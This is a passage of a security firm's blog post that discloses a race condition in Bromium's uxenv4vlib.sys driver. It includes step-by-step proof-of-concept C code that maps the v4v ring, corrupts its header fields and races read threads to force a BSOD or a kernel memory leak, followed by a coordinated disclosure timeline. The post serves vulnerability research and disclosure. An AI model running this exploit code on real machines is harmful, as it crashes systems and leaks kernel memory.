&lrm;&rlm;&rlm;&lrm;&lrm;<span class="pl-5">&lrm;&rlm;&rlm;&lrm;uint32_t len;</span><br>
&lrm;&rlm;&rlm;&lrm;&lrm;<span class="pl-5">V4V_VOLATILE uint32_t rx_ptr;</span><br>
&lrm;&rlm;&rlm;&lrm;&lrm;<span class="pl-5">V4V_VOLATILE uint32_t tx_ptr;</span><br>
&lrm;&rlm;&rlm;&lrm;&lrm;<span class="pl-5">uint64_t reserved[4];</span><br>
&lrm;&rlm;&rlm;&lrm;&lrm;<span class="pl-5">V4V_VOLATILE uint8_t ring[0];</span><br>
};</div>
<div style="text-indent: 15px;">
<ul><li style="list-style-type: none;">
<ul><li class="Standard">Field &ldquo;len&rdquo; is the length of the v4v ring</li>
<li class="Standard">Field &ldquo;rx_ptr&rdquo; is the receive pointer into the ring where the next message to be read by the domain is located</li>
<li class="Standard">Field &ldquo;tx_ptr&rdquo; is the transmit pointer into the ring indicating where the next received message can be written into the ring</li>
<li class="Standard">Field &ldquo;ring&rdquo; is the data buffer and starts at ring[0]</li>
</ul></li>
</ul></div>
<p class="Standard">As you might guess, the vulnerability is related to the Bromium data ring management.</p>
<p>We will see later that it is possible to corrupt all the v4v_ring structure. Especially the &ldquo;len&rdquo; field, the &ldquo;rx_ptr&rdquo; and &ldquo;tx_ptr&rdquo; fields. By controlling these values, we could write or read more data than the real size of the ring buffer. Moreover, the initial size of &ldquo;v4v_ring&rdquo; structure can also be controlled through an IOCTL allowing the V4V initialisation for a domain. Hence, due to some checks already present in the <span style="color: #ff0000;">&laquo; uxenv4vlib.sys &raquo;</span> driver, <b>the vulnerability cannot be triggered during a write operation but only for a read operation</b>. Bad luck! Actually we could have expected a buffer overflow leading to a privilege escalation.</p>
<p>We also analysed where the vulnerability is located and how to trigger it. The latter is in <span style="color: #ff0000;">&laquo; gh_v4v_process_datagram_reads &raquo;</span> function which checks if the ring is not mapped by a user process. In this case the driver deals with the operation, otherwise a user process will be notified.</p>
<p><img loading="lazy" class="lazy aligncenter size-full wp-image-5882" src="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image014.jpg" alt="" width="583" height="603" srcset="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image014.jpg 583w, https://airbus-cyber-security.com/wp-content/uploads/2019/12/image014-290x300.jpg 290w" sizes="(max-width: 583px) 100vw, 583px"></p>
<p>&nbsp;</p>
<p class="Standard">Please see below screenshot of the disassembled code highlighting the check (in green) and the ring information (in red) on access.</p>
<p class="Standard">We can see that there is no synchronisation mechanism when the data is accessed. In fact, a<span style="color: #ff0000;"> <b>race condition</b> </span>could occur when a thread attempts to read and another thread attempts to modify the ring data.</p>
<p class="Standard">This scenario can be achieved because a user process can map the ring and so, can directly manipulate headers of the ring data from the user buffer. All changes are implicitly replicated to the kernel buffer.</p>
<p class="Standard">Please see below steps for the scenario leading to the vulnerability:</p>
<ol><li class="Standard">&nbsp;A reading thread attempts to read data. No user process has mapped the v4v ring. The driver should deal with the operation. Hence, before accessing the ring data, the execution thread is interrupted and a second thread is scheduled.</li>
<li class="Standard"><span style="font-size: 1rem;">The second thread maps the ring and then attempts to corrupt data, especially fields such as &ldquo;len&rdquo;, &ldquo;rx_ptr&rdquo; and &ldquo;tx_ptr&rdquo; of the &ldquo;v4v_ring&rdquo; structure.</span></li>
<li class="Standard"><span style="font-size: 1rem;">Finally, the second thread is scheduled in favour of the reading thread. This one is now using corrupted data.</span></li>
</ol><p class="Standard">As a result, we see an <span style="color: #ff0000;">Out of Bound read</span>, leading in <span style="color: #ff0000;">kernel memory leak</span> or <span style="color: #ff0000;">Denial of Service</span> depending on whether a read access violation occurs.</p>
<h2 class="Standard">Exploitation</h2>
<p class="Standard">An important point should be taken into account to successfully exploit this vulnerability. We must use asynchronous operations. If threads open the device in synchronous mode, they stay blocked until data are available. Therefore the race condition cannot be triggered. So, the attribute FILE_FLAG_OVERLAPPED must be set to open the device for asynchronous IO.</p>
<p class="Standard">By now, we will see the most important code portions which are used in this exploitation.</p>
<h3>1. Opening the device</h3>
<p class="Standard">First, we have to open the device on the vulnerable driver.</p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">
<p>memcpy(deviceName, &ldquo;\\\\.\\v4vdev&rdquo;, strlen(&ldquo;\\\\.\\v4vdev&rdquo;));</p>
<div class="pt-3"></div>
<p>deviceHandle = <span style="color: #800080;">CreateFile</span>(deviceName,</p>
<div style="padding-left: 8rem;"><span style="color: #800080;">GENERIC_READ</span> | <span style="color: #800080;">GENERIC_WRITE</span>,<br>
0,<br><span style="color: #800080;">NULL,</span><br><span style="color: #800080;">OPEN_EXISTING,</span><br><span style="color: #800080;">FILE_FLAG_OVERLAPPED,</span><br><span style="color: #800080;">NULL);</span></div>
<p><span style="color: #3366ff;">if</span> (deviceHandle == <span style="color: #800080;">INVALID_HANDLE_VALUE</span>)<br>
{<br>
&lrm;&rlm;&lrm;<span class="pl-5">printf(&ldquo;FAILED, error code: %d\n%s\n&rdquo;, GetLastError());</span><br>
&lrm;&rlm;&lrm;<span class="pl-5">exit(1);</span><br>
}</p>
</div>
<h3><span lang="DE">2. Initialise V4V (V4V_IOCTL_INITIALIZE)</span></h3>
<p>Now, we will craft the V4V_IOCTL_INITIALIZE IOCTL to initialise a V4V ring.</p>
<div style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">dwIoControlCode = 0x220040;<br>
*(<span style="color: #008080;">HANDLE*</span>)&amp;InputBuffer[0x00] = hEvent;<br>
*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x04] = 0x01fc0;<span style="color: #3366ff;">if</span> (DeviceIoControl(deviceHandle,
<div style="padding-left: 8rem;">dwIoControlCode,<br>
InputBuffer,<br>
8,<br>
OutputBuffer,<br>
8,<br>
&amp;dwBytesReturned,<br><span style="color: #800080;">NULL</span>) == 0)</div>
<p>{<br>
&lrm;&rlm;<span class="pl-5">printf(&ldquo;[main] <span style="color: #993300;">DeviceIoControl driver failed&rdquo;</span>);</span><br>
&lrm;&rlm;<span class="pl-5">exit(0);</span><br>
}</p>
</div>
<p>From the above code, the value 0x01FC0 refers to the ring buffer size in bytes. In reality, as the v4v_ring structure has a size of 0x40 bytes, the kernel will allocate 0x2000 bytes. This value was intentionally chosen in order to be aligned on the memory page size.</p>
<h3>3. Bind the V4V ring with a VM (V4V_IOCTL_BIND)</h3>
<p>The next step is to bind our V4V ring with a micro-VM ID. The following IOCTL V4V_IOCTL_BIND<b><i> </i></b>allows us to do this task.</p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">dwIoControlCode = 0x220044;<br>
*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x00] = dwVmId;;<br>
*(<span style="color: #008080;">WORD*</span>)&amp;InputBuffer[0x04] = 0x7FFF;<br>
*(<span style="color: #008080;">WORD*</span>)&amp;InputBuffer[0x06] = 0x7FFE;
<div class="pt-3"></div>
<p>*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x08] = 0x00000000;<br>
*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x0c] = 0x00000000;<br>
*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x10] = 0x00000000;<br>
*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x14] = 0x00000000;</p>
<div class="pt-3"></div>
<p><span style="color: #3366ff;">if</span> (DeviceIoControl(deviceHandle,</p>
<div style="padding-left: 8rem;">dwIoControlCode,<br>
InputBuffer,<br>
0x18,<br>
OutputBuffer,<br>
512,<br>
&amp;dwBytesReturned,<br><span style="color: #800080;">NULL</span>) == 0)</div>
<p>{<br>
&lrm;&rlm;<span class="pl-5">printf(<span style="color: #993300;">&ldquo;[main] error code: %d\n\n&rdquo;</span>, GetLastError());</span><br>
&lrm;&rlm;<span class="pl-5">exit(0);</span><br>
}</p>
</div>
<p>We focus in particular on the first three fields of the &ldquo;InputBuffer&rdquo;. The first one represents the VM ID, the two following have been retrieved by reverse engineering. In fact, this represents a &ldquo;v4v_addr&rdquo; structure as described below:</p>
<div style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">struct v4v_ring_id<br>
{<br>
&lrm;&rlm;<span class="pl-4">struct v4v_addr addr;</span><br>
&lrm;&rlm;<span class="pl-4">domid_t partner;</span><br>
};</div>
<h3>4. Writing data into the ring buffer</h3>
<p>With correct configuration, we could write in the device thanks to this piece of code.</p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">memset(InputBuffer, 0x41, <span style="color: #3366ff;">sizeof</span>(InputBuffer));<br>
*(<span style="color: #008080;">DWORD*</span>)&amp;InputBuffer[0x00] = dwVmId;<br>
*(<span style="color: #008080;">WORD*</span>)&amp;InputBuffer[0x04] = 0x0000;<br>
*(<span style="color: #008080;">WORD*</span>)&amp;InputBuffer[0x06] = 0x0000;
<div class="pt-3"></div>
<p><span style="color: #008080;">BOOLEAN</span> bErrorFlag = WriteFile(</p>
<div style="padding-left: 8rem;">deviceHandle, <span style="color: #339966;">// open file handle</span><br>
InputBuffer, <span style="color: #339966;">// start of data to write</span><br>
0x1fa0, <span style="color: #339966;">// number of bytes to write</span><br><span style="color: #800080;">NULL</span>, <span style="color: #339966;">// number of bytes that were written</span><br>
&amp;tOverlapped);&nbsp;<span style="color: #339966;">// no overlapped structure</span></div>
</div>
<p class="Standard">As you might understand, a simple write in the device fills the ring buffer. However, a short header must be used to set the VM ID in order to target a specific micro-VM.</p>
<h3>5. Creating the &ldquo;MapRing&rdquo; and the &ldquo;Read&rdquo; threads</h3>
<p>We are ready to start two concurrency threads in charge of respectively mapping the ring and reading the data previously written.</p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">context1.hDevice = deviceHandle;<br>
context1.hEvent = hDumpRingEvent;<br>
hWriteThread = CreateThread(<span style="color: #800080;">NULL</span>, <span class="pl-4"><span class="pl-4">0, MapRingThread, &amp;context1, <span style="color: #800080;">CREATE_SUSPENDED,<br>
NULL</span>);<br><span style="color: #3366ff;">if</span> (hWriteThread == <span style="color: #800080;">NULL</span>)<br>
{<br>
&lrm;&rlm;<span class="pl-4">printf(&ldquo;[main] MAPRING CreateThread FAILED, error code: %d\n\n&rdquo;,</span><br>
GetLastError());<br>
&lrm;&rlm;<span class="pl-4">exit(0);</span><br>
}</span></span>
<div class="pt-3"></div>
<p>context2.hDevice = deviceHandle;<br>
context2.hEvent = hReadEvent;<br>
hReadThread = CreateThread( <span style="color: #800080;">NULL</span>, <span class="pl-4">0, ReadThread, &amp;context2, <span style="color: #800080;">CREATE_SUSPENDED,<br>
NULL</span>);</span><br><span style="color: #3366ff;">if</span> (hReadThread == <span style="color: #800080;">NULL</span>)<br>
{<br>
&lrm;&rlm;<span class="pl-4">printf(<span style="color: #993300;">&ldquo;[main] READ CreateThread FAILED, error code: %d\n\n&rdquo;</span>, GetLastError());</span><br>
&lrm;&rlm;<span class="pl-4">exit(0);</span><br>
}</p>
<div class="pt-3">ResumeThread(hWriteThread);<br>
ResumeThread(hReadThread);</div>
</div>
<p>You will notice that the two threads are created in suspended mode and resume at the &ldquo;same&rdquo; time. Thus, we assure a better chance of causing the race condition. Implementation of these threads are described below.</p>
<h3>6. MapRing thread (V4V_IOCTL_MAPRING)</h3>
<p>The V4V ring could me mapped in user land through the V4V_IOCTL_MAPRING IOCTL.</p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">
<p><span style="color: #0000ff;">if</span> (DeviceIoControl(deviceHandle,</p>
<div style="padding-left: 8rem;">0x220068,<br>
InputBuffer,<br>
8,<br>
OutputBuffer,<br>
512,<br>
&amp;dwBytesReturned,<br><span style="color: #800080;">NULL</span>) == 0)</div>
<p>{<br>
&lrm;&rlm;<span class="pl-4">printf<span style="color: #993300;">(&ldquo;[MapRingThread] DeviceIoControl driver failed&rdquo;)</span>;</span><br>
&lrm;&rlm;<span class="pl-4">exit(0);</span><br>
}</p>
<div class="pt-3"></div>
<p><span style="color: #008080;">v4v_ring_header</span> *ptV4vRingHeader;<br>
ptV4vRingHeader = (<span style="color: #008080;">v4v_ring_header</span><span style="color: #000000;">*</span>)(*(<span style="color: #008080;">ULONG64</span>*)(OutputBuffer));<br>
ptV4vRingHeader-&gt;len = 0xffffffff;<br>
ptV4vRingHeader-&gt;rx_ptr = 0xeeeeeeee;<br>
ptV4vRingHeader-&gt;tx_ptr = 0xffffffff;</p>
<div class="pt-3">SetEvent(pContext&rarr;hEvent);</div>
</div>
<p>Once we have retrieved a user address on the ring, we will overwrite data before the read operation occurs. In this case, the values of &ldquo;len&rdquo;, &ldquo;rx_ptr&rdquo; and &ldquo;tx_ptr&rdquo; fields are set to cause a nice BSOD.</p>
<h3>7. Read thread</h3>
<p>The race condition could be triggered thanks to a read operation.</p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">
<p>bErrorFlag = ReadFile(</p>
<div style="padding-left: 8rem;">deviceHandle, <span style="color: #339966;">// open file handle</span><br>
InputBuffer, <span style="color: #339966;">// start of data to write</span><br>
0x10, <span style="color: #339966;">// number of bytes to read</span><br><span style="color: #800080;">NULL</span>, <span style="color: #339966;">// number of bytes that were written</span><br>
&amp;tOverlapped); <span style="color: #339966;">// no overlapped structure</span></div>
<div class="pt-3">SetEvent(pContext-&gt;hEvent);</div>
</div>
<h3 class="Standard">8. Repeat, repeat and so on</h3>
<p class="Standard">Finally, loop infinitely with this scenario by incrementing the VM ID. After a few moments, we should get a BSOD or an Out of Bound memory read depending on the values crafted in the mapped ring.</p>
<h2 class="Standard">Demonstration</h2>
<p class="Standard">This demonstration has been tested on Windows 7 x64 Home Basic and Enterprise.</p>
<p><img loading="lazy" class="lazy aligncenter size-full wp-image-5885" src="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image015.jpg" alt="" width="467" height="281" srcset="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image015.jpg 467w, https://airbus-cyber-security.com/wp-content/uploads/2019/12/image015-300x181.jpg 300w" sizes="(max-width: 467px) 100vw, 467px"></p>
<p class="Standard">I have noticed that the hardware configuration, in particular the amount of CPUs, can affect the success of this exploitation. On large hardware configuration, we have to launch several instances of the POC to trig the vulnerability.</p>
<p class="Standard">As soon as the vulnerability is triggered, we could get the following BSOD:</p>
<p><img loading="lazy" class="lazy aligncenter size-full wp-image-5888" src="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image016.jpg" alt="" width="508" height="376" srcset="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image016.jpg 508w, https://airbus-cyber-security.com/wp-content/uploads/2019/12/image016-300x222.jpg 300w" sizes="(max-width: 508px) 100vw, 508px"></p>
<p>For in-depth analysis, more accurate information can be obtained through a Windows debugger.</p>
<p>&nbsp;</p>
<p><img loading="lazy" class="lazy aligncenter size-full wp-image-5891" src="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image017.jpg" alt="" width="550" height="465" srcset="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image017.jpg 550w, https://airbus-cyber-security.com/wp-content/uploads/2019/12/image017-300x254.jpg 300w" sizes="(max-width: 550px) 100vw, 550px"></p>
<h2>Conclusion</h2>
<p>In conclusion, as this bug is a race condition, it has been quite difficult to find it. But it is always fun to discover this type of vulnerability. Finally, we are dealing with a design mistake because the developer omits to protect data from concurrency access. Another remediation could be to hide access on the ring header from the user and so, prevent the alteration of critical fields. Nevertheless, this vulnerability is not exploitable for a privilege escalation but could help to reach this effect thanks to the memory leak.</p>
<p><strong><em>&nbsp;</em></strong></p>
<h3>Disclosure Timeline</h3>
<p>Airbus CyberSecurity follows the widely accepted 90-day vulnerability disclosure policy; meaning Airbus CyberSecurity won&rsquo;t engage any public communication about the reported vulnerability during that time frame without any prior public communication or fix. Please note that Airbus CyberSecurity&rsquo;s&nbsp;general position is that as soon a working and active relationship is established, there is no need to blindly push for the 90-day vulnerability disclosure if it&rsquo;s not necessary.</p>
<p>Bromium reacted quickly to this issue both to confirm the vulnerability and fix the issue.</p>
<p>July 22th, 2019&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Vulnerability Reported</p>
<p>July 23th, 2019 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Initial response from Bromium:<br>
&ndash;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Issue is confirmed and root cause is identified<br>
&ndash;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Patch is scheduled for end of August<br>
&ndash;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Airbus will be invited to test the forthcoming release</p>
<p>July 30<sup>th</sup>, 2019 &nbsp; &nbsp; &nbsp; Bromium committed a patch on &ldquo;<a href="https://github.com/uxen-virt/uxen">https://github.com/uxen-virt/uxen</a>&rdquo;</p>
<p>Sept 10<sup>th</sup>, 2019 &nbsp; &nbsp; &nbsp; Bromium made the fix available to all customers in 4.1.7 update 1</p>
<p>Oct 9th, 2019&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bromium provided us more details on the fix</p>
<p>Nov 4th, 2019&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CVE process is initiated</p>
<p>Feb&nbsp;7th, 2020 &nbsp; &nbsp; &nbsp; &nbsp; Airbus publishes the report associated with the CVE</p>
<p>Feb 10th, 2020 &nbsp; &nbsp; &nbsp; Update the Disclosure Timeline with more accurate information</p>
<p>&nbsp;</p></body></html>
                                            <div class="row">
                            <div class="col-sm-12">
 <section class="page">
            </section>
</div>

                        </div>
                                        
                    
                                            <a class="button mt-3 mb-3" href="https://airbus-cyber-security.com/blog">Back to Blog</a>
                    
                    
                    
                                    </section>
                    </div>
    </div>
</div>
      </main><!-- /.main -->
              <aside class="sidebar">
           
            
        
<aside class="contact">
    <header>
        <a href="#" data-toggle="modal" data-target="#demo"><h5>Contact Us <img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/email-white.svg"></h5></a>
    </header>
</aside>

    <aside class="news">
        <header>
            <h5>Latest News</h5>
        </header>
        <main>
            <ul>
                <li><a href="https://airbus-cyber-security.com/news/airbus-and-alstom-sign-cyber-security-cooperation-agreement/">Paris, 8&nbsp;September 2021 &ndash; Airbus CyberSecurity and Alstom, global leader in sustainable mobility, have signed a worldwide cooperation agreement...</a></li><li><a href="https://airbus-cyber-security.com/news/airbus-cybersecurity-and-kub-partner-to-offer-the-best-decontamination-solution-for-removable-devices/">Paris, September 8, 2021 &ndash; Airbus CyberSecurity announces its collaboration with KUB, the industry leader in removable device decontamination,...</a></li><li><a href="https://airbus-cyber-security.com/news/airbus-cybersecurity-and-claroty-partner-to-secure-manufacturing-environments/">Collaboration Incorporates Airbus CyberSecurity&rsquo;s Security Operations Centre 4.0 Managed Security Services with Claroty&rsquo;s Industrial Cybersecurity Platform Airbus CyberSecurity and...</a></li>            </ul>
        </main>
</aside>


<div class="modal fade" id="demo" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel">Contact Us</h4>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            </div>
            <div class="modal-body">

                 
                <div class="contact-form">
                <script>
                hbspt.forms.create({
                    portalId: "3786665",
                    formId: "c824a424-8d4b-4803-9238-c840db45b3b2",
                    submitButtonClass: 'button mt-3',
                    css: ''
                });
                </script>
                </div>

                
        </div>
    </div>
</div>        </aside><!-- /.sidebar -->
            </div>
    </div><!-- /.content -->
  </div><!-- /.wrap -->
<footer class="dark-blue">
  <div class="container">
    <nav class="nav-footer-one">
      <h5>Site Map</h5>
      <div class="menu-footer-one-container"><ul id="menu-footer-one" class="nav"><li id="menu-item-78" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-78"><a href="https://airbus-cyber-security.com/industries/">Industries</a></li>
<li id="menu-item-77" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-77"><a href="https://airbus-cyber-security.com/products-and-services/">Products &#038; Services</a></li>
<li id="menu-item-76" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76"><a href="https://airbus-cyber-security.com/about/">About Us</a></li>
<li id="menu-item-79" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79"><a href="https://airbus-cyber-security.com/news-and-events/">News &#038; Events</a></li>
<li id="menu-item-1977" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1977"><a href="https://airbus-cyber-security.com/resources/">Resources</a></li>
<li id="menu-item-259" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-259"><a href="https://airbus-cyber-security.com/blog/">Blog</a></li>
<li id="menu-item-80" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-80"><a href="https://airbus-cyber-security.com/contact-us/">Contact Us</a></li>
</ul></div>    </nav>

    <nav class="nav-footer-two">
      <h5>Useful Links</h5>
      <div class="menu-footer-two-container"><ul id="menu-footer-two" class="nav"><li id="menu-item-82" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-82"><a target="_blank" rel="noopener noreferrer" href="http://www.airbus.com/">Airbus</a></li>
<li id="menu-item-81" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81"><a target="_blank" rel="noopener noreferrer" href="https://www.stormshield.com">Stormshield</a></li>
<li id="menu-item-2197" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2197"><a href="https://airbus-cyber-security.com/conditions-of-purchase/">Conditions of purchase</a></li>
</ul></div>    </nav>

    <nav class="nav-footer-three">
      <h5>Careers</h5>
      <div class="menu-footer-three-container"><ul id="menu-footer-three" class="nav"><li id="menu-item-4182" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4182"><a href="https://airbus-cyber-security.com/cyber-security-jobs-careers/">Jobs &#038; Careers</a></li>
</ul></div>    </nav>
        <ul class="social">
            <li><a target="_blank" aria-label="Twitter" rel="noopner noreferrer" href="https://twitter.com/AirbusCyber"><img alt="Twitter" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/twitter-white.svg"></a></li>
                <li><a target="_blank" aria-label="Linkedin" rel="noopner noreferrer" href="http://www.linkedin.com/company/AirbusCyber"><img alt="Linkedin" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/linkedin-white.svg"></a></li>
                <li><a href="https://airbus-cyber-security.com/contact-us" aria-label="Contact"><img alt="contact" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/contact-white.svg"></a></li>
    </ul>  </div>
</footer><footer class="black">
  <div class="container">
    <div class="row">
      <div class="col-md-12 col-lg-6">
                  <a href="https://airbus-cyber-security.com/terms-of-use">Terms of use</a>
          <a href="https://airbus-cyber-security.com/privacy-policy">Privacy Policy</a>
              </div>
      <div class="col-md-12 col-lg-6">
        <span class="copy">
          &copy; Airbus 2021        </span>
      </div>
    </div>
  </div>
</footer><script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery.matchHeight/0.7.2/jquery.matchHeight-min.js' id='match-height-js'></script>
<script type='text/javascript' src='https://airbus-cyber-security.com/wp-content/themes/airbus/dist/scripts/bxslider.min.js' id='bx-slider-js'></script>
<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js' id='poper-js-js'></script>
<script type='text/javascript' src='https://cdn.jsdelivr.net/jquery.cookie/1.4.1/jquery.cookie.min.js' id='cookie-js-js'></script>
<script type='text/javascript' src='//cdnjs.cloudflare.com/ajax/libs/jquery.lazy/1.7.6/jquery.lazy.min.js' id='lazy-load-js'></script>
<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js' id='magnific-popup-js'></script>
<script type='text/javascript' src='https://airbus-cyber-security.com/wp-content/themes/airbus/dist/scripts/main.js' id='sage/js-js'></script>
<script type='text/javascript' src='https://airbus-cyber-security.com/wp-includes/js/wp-embed.min.js?ver=5.5.6' id='wp-embed-js'></script>
<!-- Start of HubSpot Embed Code -->
<!-- <script type="text/javascript" id="hs-script-loader" async defer src="//js.hs-scripts.com/3786665.js"></script> -->
<!-- End of HubSpot Embed Code -->

</body>
</html>
